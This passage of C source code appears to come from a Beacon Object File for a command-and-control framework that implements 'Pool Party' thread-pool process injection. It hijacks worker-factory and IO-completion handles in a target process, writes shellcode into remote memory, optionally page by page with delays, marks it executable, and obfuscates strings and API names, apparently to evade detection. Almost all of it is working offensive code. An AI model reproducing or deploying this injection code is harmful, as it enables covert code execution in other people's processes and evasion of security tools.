                m_dwWfTypeIndex = snapType;
            }
            MSVCRT$memset(wfName, 0, sizeof(wfName));
        }
#endif

        found = p_hDuplicatedObject;
        break;
    }

    BofFree(Information);
    return found;
}

static HANDLE HijackType(HANDLE p_hTarget, const unsigned char *enc, int n, DWORD dwDesiredAccess, ULONG typeIndex) {
    wchar_t name[64];
    HANDLE h;
    if (n <= 0 || n > (int)sizeof(name)) {
        return NULL;
    }
    MSVCRT$memset(name, 0, sizeof(name));
    ObfDecBytes((unsigned char *)name, enc, n);
    h = HijackProcessHandle(name, p_hTarget, dwDesiredAccess, typeIndex);
    MSVCRT$memset(name, 0, sizeof(name));
    if (h != NULL) {
        ApiPause();
    }
    return h;
}

#ifdef PP_RESOLVE_POOL_IOCP
static BOOL QueryWorkerFactoryBasicInformation(HANDLE hWorkerFactory, PWORKER_FACTORY_BASIC_INFORMATION pInfo) {
    _NtQueryInformationWorkerFactory NtQueryInformationWorkerFactory;
    NTSTATUS Ntstatus;

    if (pInfo == NULL || hWorkerFactory == NULL) {
        return FALSE;
    }
    MSVCRT$memset(pInfo, 0, sizeof(*pInfo));
    NtQueryInformationWorkerFactory = (_NtQueryInformationWorkerFactory)ResolveNtdllEnc(kApiNtQueryInformationWorkerFactory, (int)sizeof(kApiNtQueryInformationWorkerFactory));
    if (NtQueryInformationWorkerFactory == NULL) {
        return FALSE;
    }
    Ntstatus = NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, pInfo, sizeof(*pInfo), NULL);
    return NT_SUCCESS(Ntstatus);
}

static BOOL HandleTypeNameIs(HANDLE h, const unsigned char *enc, int n) {
    BYTE *info;
    PPUBLIC_OBJECT_TYPE_INFORMATION typeObj;
    wchar_t name[64];
    int wantChars;
    BOOL ok;

    if (h == NULL || enc == NULL || n <= 0 || n > (int)sizeof(name)) {
        return FALSE;
    }
    info = NtQueryObject_(h, ObjectTypeInformation);
    if (info == NULL) {
        return FALSE;
    }
    MSVCRT$memset(name, 0, sizeof(name));
    ObfDecBytes((unsigned char *)name, enc, n);
    wantChars = WideEncChars(enc, n);
    typeObj = (PPUBLIC_OBJECT_TYPE_INFORMATION)info;
    ok = UnicodeNameEquals(&typeObj->TypeName, name, wantChars);
    MSVCRT$memset(name, 0, sizeof(name));
    BofFree(info);
    return ok;
}

static HANDLE DuplicatePoolIoCompletion(HANDLE hWorkerFactory) {
    WORKER_FACTORY_BASIC_INFORMATION info;
    HANDLE remoteIocp;
    HANDLE localIocp;
    LPCVOID portAddr;

    remoteIocp = NULL;
    localIocp = NULL;
    if (!QueryWorkerFactoryBasicInformation(hWorkerFactory, &info)) {
        return NULL;
    }
    if (info.StartParameter == NULL) {
        return NULL;
    }
    portAddr = (LPCVOID)((ULONG_PTR)info.StartParameter + offsetof(FULL_TP_POOL, CompletionPort));
    if (!KERNEL32$ReadProcessMemory(m_p_hTargetPid, portAddr, &remoteIocp, sizeof(remoteIocp), NULL)) {
        return NULL;
    }
    if (remoteIocp == NULL || remoteIocp == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    if (!KERNEL32$DuplicateHandle(
            m_p_hTargetPid,
            remoteIocp,
            KERNEL32$GetCurrentProcess(),
            &localIocp,
            IO_COMPLETION_MODIFY_STATE,
            FALSE,
            0)) {
        return NULL;
    }
    if (m_bSanityOnly) {
        if (!HandleTypeNameIs(localIocp, kTypeIoCompletion, (int)sizeof(kTypeIoCompletion))) {
            KERNEL32$CloseHandle(localIocp);
            return NULL;
        }
    }
    return localIocp;
}

static HANDLE HijackThreadPoolIoCompletion(HANDLE p_hTarget) {
    BYTE *Information;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
    ULONG_PTR i;
    ULONG_PTR n;
    ULONG infoLen;
    HANDLE found;
    wchar_t wfName[64];
    int wfChars;

    found = NULL;
    if (p_hTarget == NULL) {
        return NULL;
    }
    infoLen = 0;
    Information = QueryHandleSnapshotEx(p_hTarget, &infoLen);
    if (Information == NULL) {
        return NULL;
    }

    MSVCRT$memset(wfName, 0, sizeof(wfName));
    ObfDecBytes((unsigned char *)wfName, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
    wfChars = WideEncChars(kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
    snap = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
    n = SnapshotHandleCount(Information, infoLen);

    for (i = 0; i < n; i++) {
        HANDLE hWf;
        HANDLE hIocp;
        BYTE *typeInfo;
        PPUBLIC_OBJECT_TYPE_INFORMATION typeObj;
        ACCESS_MASK granted;
        ULONG snapType;
        BOOL isWf;

        granted = snap->Handles[i].GrantedAccess;
        if (!SnapshotAccessOk(granted, WORKER_FACTORY_QUERY_INFORMATION)) {
            continue;
        }
        snapType = snap->Handles[i].ObjectTypeIndex;

        hWf = NULL;
        if (!KERNEL32$DuplicateHandle(
                p_hTarget,
                snap->Handles[i].HandleValue,
                KERNEL32$GetCurrentProcess(),
                &hWf,
                WORKER_FACTORY_QUERY_INFORMATION,
                FALSE,
                0)) {
            continue;
        }

        isWf = FALSE;
        if (m_dwWfTypeIndex != 0 && snapType == m_dwWfTypeIndex) {
            isWf = TRUE;
        } else {
            typeInfo = NtQueryObject_(hWf, ObjectTypeInformation);
            if (typeInfo == NULL) {
                KERNEL32$CloseHandle(hWf);
                continue;
            }
            typeObj = (PPUBLIC_OBJECT_TYPE_INFORMATION)typeInfo;
            if (UnicodeNameEquals(&typeObj->TypeName, wfName, wfChars)) {
                isWf = TRUE;
                if (snapType != 0) {
                    m_dwWfTypeIndex = snapType;
                }
            }
            BofFree(typeInfo);
        }
        if (!isWf) {
            KERNEL32$CloseHandle(hWf);
            continue;
        }

        hIocp = DuplicatePoolIoCompletion(hWf);
        KERNEL32$CloseHandle(hWf);
        if (hIocp != NULL) {
            found = hIocp;
            break;
        }
    }

    MSVCRT$memset(wfName, 0, sizeof(wfName));
    BofFree(Information);
    if (found != NULL) {
        ApiPause();
    }
    return found;
}
#endif

#if defined(PP_RESOLVE_POOL_IOCP) || defined(PP_HIJACK_TIMER)
static ULONG CountWorkerFactories(HANDLE p_hTarget) {
    BYTE *Information;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION snap;
    ULONG_PTR i;
    ULONG_PTR n;
    ULONG infoLen;
    ULONG count;
    wchar_t wfName[64];
    int wfChars;

    count = 0;
    if (p_hTarget == NULL) {
        return 0;
    }
    infoLen = 0;
    Information = QueryHandleSnapshotEx(p_hTarget, &infoLen);
    if (Information == NULL) {
        return 0;
    }
    MSVCRT$memset(wfName, 0, sizeof(wfName));
    ObfDecBytes((unsigned char *)wfName, kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
    wfChars = WideEncChars(kTypeWorkerFactory, (int)sizeof(kTypeWorkerFactory));
    snap = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)Information;
    n = SnapshotHandleCount(Information, infoLen);
    for (i = 0; i < n; i++) {
        HANDLE hWf;
        BYTE *typeInfo;
        PPUBLIC_OBJECT_TYPE_INFORMATION typeObj;
        ULONG snapType;
        BOOL isWf;

        if (!SnapshotAccessOk(snap->Handles[i].GrantedAccess, WORKER_FACTORY_QUERY_INFORMATION)) {
            continue;
        }
        snapType = snap->Handles[i].ObjectTypeIndex;
        hWf = NULL;
        if (!KERNEL32$DuplicateHandle(
                p_hTarget,
                snap->Handles[i].HandleValue,
                KERNEL32$GetCurrentProcess(),
                &hWf,
                WORKER_FACTORY_QUERY_INFORMATION,
                FALSE,
                0)) {
            continue;
        }
        isWf = FALSE;
        if (m_dwWfTypeIndex != 0 && snapType == m_dwWfTypeIndex) {
            isWf = TRUE;
        } else {
            typeInfo = NtQueryObject_(hWf, ObjectTypeInformation);
            if (typeInfo != NULL) {
                typeObj = (PPUBLIC_OBJECT_TYPE_INFORMATION)typeInfo;
                if (UnicodeNameEquals(&typeObj->TypeName, wfName, wfChars)) {
                    isWf = TRUE;
                    if (snapType != 0) {
                        m_dwWfTypeIndex = snapType;
                    }
                }
                BofFree(typeInfo);
            }
        }
        KERNEL32$CloseHandle(hWf);
        if (isWf) {
            count++;
        }
    }
    MSVCRT$memset(wfName, 0, sizeof(wfName));
    BofFree(Information);
    return count;
}
#endif

LPVOID AllocateShellcodeMemory() {
    LPVOID ShellcodeAddress = KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, (SIZE_T)m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (ShellcodeAddress == NULL) {
        return NULL;
    }
    ApiPause();
    return ShellcodeAddress;
}

HANDLE GetTargetProcessHandle() {
    HANDLE p_hTargetPid = KERNEL32$OpenProcess(PP_OPEN_PROCESS_ACCESS, FALSE, m_dwTargetPid);
    if (p_hTargetPid == NULL) {
        return NULL;
    }
    ApiPause();
    return p_hTargetPid;
}

BOOL WriteShellcode() {
    SIZE_T written;

    written = 0;
    if (m_ShellcodeAddress == NULL || m_cShellcode == NULL || m_szShellcodeSize <= 0) {
        return FALSE;
    }
    if (!KERNEL32$WriteProcessMemory(
            m_p_hTargetPid,
            m_ShellcodeAddress,
            m_cShellcode,
            (SIZE_T)m_szShellcodeSize,
            &written) ||
        written != (SIZE_T)m_szShellcodeSize) {
        return FALSE;
    }
    ApiPause();
    return TRUE;
}

static void DripWait(void) {
    DWORD start;

    if (m_dwDripDelayMs == 0) {
        return;
    }
    start = KERNEL32$GetTickCount();
    while ((KERNEL32$GetTickCount() - start) < m_dwDripDelayMs) {
        KERNEL32$SwitchToThread();
    }
}

/*
 * 0 = ok, 1 = reserve/commit fail, 2 = write fail.
 * On failure the reservation is released and m_ShellcodeAddress is NULL.
 */
static int DripReserveCommitWrite(void) {
    SYSTEM_INFO si;
    SIZE_T pageSize;
    SIZE_T total;
    SIZE_T offset;
    SIZE_T chunk;
    SIZE_T written;
    LPVOID base;

    MSVCRT$memset(&si, 0, sizeof(si));
    KERNEL32$GetSystemInfo(&si);
    pageSize = (SIZE_T)si.dwPageSize;
    if (pageSize == 0) {
        pageSize = 4096;
    }
    total = (SIZE_T)m_szShellcodeSize;
    if (total == 0 || m_cShellcode == NULL) {
        return 1;
    }

    base = KERNEL32$VirtualAllocEx(m_p_hTargetPid, NULL, total, MEM_RESERVE, PAGE_NOACCESS);
    if (base == NULL) {
        return 1;
    }
    m_ShellcodeAddress = base;

    offset = 0;
    while (offset < total) {
        chunk = total - offset;
        if (chunk > pageSize) {
            chunk = pageSize;
        }
        if (KERNEL32$VirtualAllocEx(
                m_p_hTargetPid,
                (LPBYTE)base + offset,
                pageSize,
                MEM_COMMIT,
                PAGE_READWRITE) == NULL) {
            FreeShellcodeRemote();
            return 1;
        }
        written = 0;
        if (!KERNEL32$WriteProcessMemory(
                m_p_hTargetPid,
                (LPBYTE)base + offset,
                m_cShellcode + offset,
                chunk,
                &written) ||
            written != chunk) {
            FreeShellcodeRemote();
            return 2;
        }
        KERNEL32$SwitchToThread();
        offset += chunk;
        if (offset < total) {
            DripWait();
        }
    }
    return 0;
}

static int QueryTargetArch(HANDLE hProc) {
    BOOL wow;
    char k32[16];
    char api[32];
    HMODULE hK32;
    _IsWow64Process2 fn;
    USHORT processMachine;
    USHORT nativeMachine;

    if (hProc == NULL) {
        return PP_ARCH_UNKNOWN;
    }

    MSVCRT$memset(k32, 0, sizeof(k32));
    MSVCRT$memset(api, 0, sizeof(api));
    ObfDec(k32, kModKernel32, (int)sizeof(kModKernel32));
    ObfDec(api, kApiIsWow64Process2, (int)sizeof(kApiIsWow64Process2));
    hK32 = KERNEL32$GetModuleHandleA(k32);
    fn = NULL;
    if (hK32 != NULL) {
        fn = (_IsWow64Process2)KERNEL32$GetProcAddress(hK32, api);
    }
    ObfWipe(k32, (int)sizeof(k32));
    ObfWipe(api, (int)sizeof(api));
    if (fn != NULL) {
        processMachine = 0;
        nativeMachine = 0;
        if (!fn(hProc, &processMachine, &nativeMachine)) {
            return PP_ARCH_UNKNOWN;
        }
        if (nativeMachine == IMAGE_FILE_MACHINE_ARM64 || processMachine == IMAGE_FILE_MACHINE_ARM64) {
            return PP_ARCH_UNKNOWN + 1;
        }
        if (processMachine != IMAGE_FILE_MACHINE_UNKNOWN &&
            processMachine != IMAGE_FILE_MACHINE_AMD64 &&
            processMachine != 0) {
            return PP_ARCH_WOW64;
        }
    }

    wow = FALSE;
    if (!KERNEL32$IsWow64Process(hProc, &wow)) {
        return PP_ARCH_UNKNOWN;
    }
    return wow ? PP_ARCH_WOW64 : PP_ARCH_NATIVE;
}

static void InjectCleanup(void) {
    CloseHandleSafe(&m_p_hTargetPid);
}

static BOOL ParseBeaconArgs(char *args, int len) {
    datap parser;
    int delaySec;
    int drip;
    int dripMs;
    int delayIn;
    int dripMsIn;

    BeaconDataParse(&parser, args, len);
    m_dwTargetPid = BeaconDataInt(&parser);
    if (BeaconDataLength(&parser) == 0) {
        m_bSanityOnly = TRUE;
        m_cShellcode = NULL;
        m_szShellcodeSize = 0;
        m_dwApiDelayMs = 0;
        m_bDripAlloc = FALSE;
        m_dwDripDelayMs = 0;
        return TRUE;
    }

    m_bSanityOnly = FALSE;
    delayIn = BeaconDataInt(&parser);
    drip = BeaconDataInt(&parser);
    dripMsIn = BeaconDataInt(&parser);
    delaySec = delayIn;
    dripMs = dripMsIn;
    if (delaySec < 0) {
        delaySec = 0;
    }
    if (delaySec > API_PACE_MAX_SEC) {
        delaySec = API_PACE_MAX_SEC;
        OBF_PRINT0(CALLBACK_OUTPUT, kFmtClampDelay);
    }
    m_dwApiDelayMs = (DWORD)delaySec * 1000u;
    m_bDripAlloc = (drip != 0) ? TRUE : FALSE;
    if (dripMs < 0) {
        dripMs = 0;
    }
    if (dripMs > DRIP_DELAY_MAX_MS) {
        dripMs = DRIP_DELAY_MAX_MS;
        if (m_bDripAlloc) {
            OBF_PRINT0(CALLBACK_OUTPUT, kFmtClampDrip);
        }
    }
    if (!m_bDripAlloc) {
        dripMs = 0;
    }
    m_dwDripDelayMs = (DWORD)dripMs;
    m_cShellcode = (unsigned char *)BeaconDataExtract(&parser, &m_szShellcodeSize);
    if (m_cShellcode == NULL || m_szShellcodeSize <= 0) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtBadSc);
        return FALSE;
    }
    return TRUE;
}

static BOOL InjectBegin(void) {
    if (m_dwTargetPid == KERNEL32$GetCurrentProcessId()) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtSelfPid);
        return FALSE;
    }
    OBF_PRINT1(CALLBACK_OUTPUT, kFmtScSize, m_szShellcodeSize);
    OBF_PRINT1(CALLBACK_OUTPUT, kFmtStart, m_dwTargetPid);
    m_p_hTargetPid = GetTargetProcessHandle();
    if (m_p_hTargetPid == NULL) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtCannotOpen);
        return FALSE;
    }
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtHandle);
    return TRUE;
}

#define SANITY_FAIL(errEnc, sugEnc) do { \
    OBF_PRINT0(CALLBACK_ERROR, kFmtSanityFail); \
    OBF_PRINT0(CALLBACK_ERROR, errEnc); \
    OBF_PRINT0(CALLBACK_OUTPUT, sugEnc); \
} while (0)

static BOOL SanityOpenTarget(void) {
    int arch;

    if (m_dwTargetPid == KERNEL32$GetCurrentProcessId()) {
        SANITY_FAIL(kFmtSelfPid, kFmtSuggestPid);
        return FALSE;
    }
    m_p_hTargetPid = KERNEL32$OpenProcess(PP_OPEN_PROCESS_ACCESS, FALSE, m_dwTargetPid);
    if (m_p_hTargetPid == NULL) {
        SANITY_FAIL(kFmtCannotOpen, kFmtSuggestPid);
        return FALSE;
    }
    if (KERNEL32$WaitForSingleObject(m_p_hTargetPid, 0) == WAIT_OBJECT_0) {
        SANITY_FAIL(kFmtDeadPid, kFmtSuggestPid);
        InjectCleanup();
        return FALSE;
    }
    arch = QueryTargetArch(m_p_hTargetPid);
    if (arch == PP_ARCH_UNKNOWN) {
        SANITY_FAIL(kFmtWow64Query, kFmtSuggestPid);
        InjectCleanup();
        return FALSE;
    }
    if (arch == (PP_ARCH_UNKNOWN + 1)) {
        SANITY_FAIL(kFmtArm64, kFmtSuggestPid);
        InjectCleanup();
        return FALSE;
    }
    if (arch == PP_ARCH_WOW64) {
        SANITY_FAIL(kFmtWow64, kFmtSuggestPid);
        InjectCleanup();
        return FALSE;
    }
    return TRUE;
}

static BOOL VariantSanity(void) {
#if defined(PP_RESOLVE_POOL_IOCP) || defined(PP_HIJACK_TIMER)
    ULONG wfCount;
#endif
#ifdef PP_RESOLVE_POOL_IOCP
    HANDLE hIocp;
#endif

    if (!SanityOpenTarget()) {
        return FALSE;
    }

#if defined(PP_RESOLVE_POOL_IOCP) || defined(PP_HIJACK_TIMER)
    wfCount = CountWorkerFactories(m_p_hTargetPid);
    if (wfCount == 0) {
        SANITY_FAIL(kFmtHijackFail, kFmtSuggestNoPool);
        InjectCleanup();
        return FALSE;
    }
    if (wfCount > 1) {
        OBF_PRINT0(CALLBACK_OUTPUT, kFmtMultiPool);
    }
#endif

#ifdef PP_RESOLVE_POOL_IOCP
    hIocp = HijackThreadPoolIoCompletion(m_p_hTargetPid);
    if (hIocp == NULL) {
        SANITY_FAIL(kFmtIocpType, kFmtSuggestLayout);
        InjectCleanup();
        return FALSE;
    }
    KERNEL32$CloseHandle(hIocp);
#endif

    if (!VariantSanityExtra()) {
        InjectCleanup();
        return FALSE;
    }

    OBF_PRINT0(CALLBACK_OUTPUT, kFmtSanityPass);
    InjectCleanup();
    return TRUE;
}

static void PoolPartyEntry(char *args, int len) {
    ResetSharedState();
    if (!ParseBeaconArgs(args, len)) {
        return;
    }
    if (m_bSanityOnly) {
        VariantSanity();
        return;
    }
    Inject();
}

static BOOL InjectAllocWrite(void) {
    DWORD oldProt = 0;
    int dripRc;

    if (m_bDripAlloc) {
        dripRc = DripReserveCommitWrite();
        if (dripRc == 1) {
            OBF_PRINT0(CALLBACK_ERROR, kFmtAllocFail);
            InjectCleanup();
            return FALSE;
        }
        if (dripRc != 0) {
            OBF_PRINT0(CALLBACK_ERROR, kFmtWriteFail);
            InjectCleanup();
            return FALSE;
        }
        {
            SYSTEM_INFO si;
            SIZE_T pageSize;
            int pages;

            MSVCRT$memset(&si, 0, sizeof(si));
            KERNEL32$GetSystemInfo(&si);
            pageSize = (SIZE_T)si.dwPageSize;
            if (pageSize == 0) {
                pageSize = 4096;
            }
            pages = (int)(((SIZE_T)m_szShellcodeSize + pageSize - 1) / pageSize);
            OBF_PRINT2(CALLBACK_OUTPUT, kFmtDrip, pages, (int)m_dwDripDelayMs);
        }
    } else {
        m_ShellcodeAddress = AllocateShellcodeMemory();
        if (m_ShellcodeAddress == NULL) {
            OBF_PRINT0(CALLBACK_ERROR, kFmtAllocFail);
            InjectCleanup();
            return FALSE;
        }
        if (!WriteShellcode()) {
            OBF_PRINT0(CALLBACK_ERROR, kFmtWriteFail);
            FreeShellcodeRemote();
            InjectCleanup();
            return FALSE;
        }
    }
    OBF_PRINT1(CALLBACK_OUTPUT, kFmtAlloc, m_ShellcodeAddress);
    OBF_PRINT0(CALLBACK_OUTPUT, kFmtWrote);
    if (!KERNEL32$VirtualProtectEx(m_p_hTargetPid, m_ShellcodeAddress, (SIZE_T)m_szShellcodeSize, PAGE_EXECUTE_READ, &oldProt)) {
        OBF_PRINT0(CALLBACK_ERROR, kFmtProtectFail);
        FreeShellcodeRemote();
        InjectCleanup();
        return FALSE;
    }
    if (!KERNEL32$FlushInstructionCache(m_p_hTargetPid, m_ShellcodeAddress, (SIZE_T)m_szShellcodeSize)) {
        OBF_PRINT0(CALLBACK_OUTPUT, kFmtFlushWarn);
    }
    ApiPause();
    return TRUE;
}